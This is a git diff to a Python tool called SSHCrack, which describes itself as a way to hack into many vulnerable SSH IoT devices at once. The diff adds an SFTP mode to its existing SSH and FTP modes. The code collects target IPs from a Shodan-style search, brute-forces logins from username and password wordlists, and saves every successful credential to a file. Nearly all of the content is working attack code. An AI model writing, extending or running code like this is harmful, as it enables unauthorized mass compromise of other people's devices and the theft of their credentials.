@@ -1,5 +1,5 @@
 # Made in Python 3.9.6
-# SSHCrack v1.0
+# SSHCrack v1.2
 # Created by BredSec
 # GitHub: https://github.com/BredSec
 # This script is designed to help automate the process of hacking into multiple vulnerable SSH IoT devices simultaneously
@@ -12,6 +12,7 @@ import paramiko
 import sys
 import getopt
 import ftplib
+import pysftp
 
 global api
 
@@ -43,7 +44,7 @@ def main(argv):
         print("\033[0;32m | (___| (___ | |__| | |    | |__) |   /  \ | |    | ' / ")
         print("\033[0;32m  \___ \___ \ |  __  | |    |  _  /   / /\ \| |    |  <  ")
         print("\033[0;32m  ____) |___) | |  | | |____| | \ \  / ____ \ |____| . \ ")
-        print("\033[0;32m |_____/_____/|_|  |_|\_____|_|  \_\/_/    \_\_____|_|\_\  v1.0\n")
+        print("\033[0;32m |_____/_____/|_|  |_|\_____|_|  \_\/_/    \_\_____|_|\_\  v1.2\n")
         print("\033[0;32m              Created by @BredSec")
         print("\n")
         print("\033[0;31m       Disclaimer: Developers not liable or responsible")
@@ -60,7 +61,7 @@ def main(argv):
         print("                              (default will be common default ssh logins)")
         print("-p --passlist <password list> | Specify a wordlist of passwords to enumerate through")
         print("                              (default will be common default ssh logins)")
-        print("-a --attack <attack method>   | Method of attack (ssh, ftp)")
+        print("-a --attack <attack method>   | Method of attack (ssh, ftp, sftp)")
         print("-o --output <filename>        | Specify the name of an output file for successful logins")
         print("-m --multi <thread number>    | Number of threads to be used during cracking (default is one)")
         print("-x                            | X mode - runs cracking on all searched IPs immediately")
@@ -75,7 +76,7 @@ def main(argv):
             print("\033[0;32m | (___| (___ | |__| | |    | |__) |   /  \ | |    | ' / ")
             print("\033[0;32m  \___ \___ \ |  __  | |    |  _  /   / /\ \| |    |  <  ")
             print("\033[0;32m  ____) |___) | |  | | |____| | \ \  / ____ \ |____| . \ ")
-            print("\033[0;32m |_____/_____/|_|  |_|\_____|_|  \_\/_/    \_\_____|_|\_\  v1.0\n")
+            print("\033[0;32m |_____/_____/|_|  |_|\_____|_|  \_\/_/    \_\_____|_|\_\  v1.2\n")
             print("\033[0;32m              Created by @BredSec")
             print("")
             print("\033[0;31m       Disclaimer: Developers not liable or responsible")
@@ -92,7 +93,7 @@ def main(argv):
             print("                              (default will be common default ssh logins)")
             print("-p --passlist <password list> | Specify a wordlist of passwords to enumerate through")
             print("                              (default will be common default ssh logins)")
-            print("-a --attack <attack method>   | Method of attack (ssh, ftp)")
+            print("-a --attack <attack method>   | Method of attack (ssh, ftp, sftp)")
             print("-o --output <filename>        | Specify the name of an output file for successful logins")
             print("-m --multi <thread number>    | Number of threads to be used during cracking (default is one)")
             print("-x                            | X mode - runs cracking on all searched IPs immediately")
@@ -114,7 +115,7 @@ def main(argv):
         elif opt in ("-p", "--passlist"):
             passlist = arg
         elif opt in ("-a", "--attack"):
-            if arg.lower() in ["ssh", "ftp"]:
+            if arg.lower() in ["ssh", "ftp", "sftp"]:
                 attackmethod = arg
                 print("Attack method " + arg + " chosen")
             else:
@@ -180,6 +181,8 @@ def main(argv):
     else:
         if attackmethod == "ftp":
             FTPConnect(multi, users, passwords, output, verbose)
+        elif attackmethod == "sftp":
+            SFTPConnect(multi, users, passwords, output, verbose)
         else:
             SSHConnect(multi, users, passwords, output, verbose)
 
@@ -196,6 +199,10 @@ def search(attackmethod, target, xmode):
                 if xmode == True:
                     ips.append (result["ip_str"])
             elif attackmethod == "ftp" and result["port"] in [20, 21]:
+                ipaddr.append(result["ip_str"])
+                if xmode == True:
+                    ips.append (result["ip_str"])
+            elif attackmethod == "sftp" and result["port"] == 22:
                 ipaddr.append(result["ip_str"])
                 if xmode == True:
                     ips.append (result["ip_str"])
@@ -267,6 +274,32 @@ def FTPConnect(multiNum, userList, passList, output, verbose):
                     ftp.login(user, password)
                     print("SUCESS <FTP>: " + user + "@" + user + " " + password)
                     ftp.quit()
+                    out.write("FTP>> " + ip + "@" + user + " " + password)
+                    out.write("\n")
+                    breakout = True
+                    break
+                except:
+                    continue
+            if breakout:
+                break
+    
+    print("\nThread cracking completed")
+    done_counter(multiNum)
+    sys.exit(0)
+
+def SFTPConnect(multiNum, userList, passList, output, verbose):
+    out = open(output, "w")
+
+    for ip in ips:
+        breakout = False
+        for user in userList:
+            for password in passList:
+                if verbose:
+                    print("Trying IP: " + ip + " Username: " + user + " Password: " + password)
+                try:
+                    sftp = pysftp.Connection(ip, username=user, password=password)
+                    print("SUCESS <FTP>: " + user + "@" + user + " " + password)
+                    sftp.close()
                     out.write("FTP>> " + ip + "@" + user + " " + password)
                     out.write("\n")
                     breakout = True
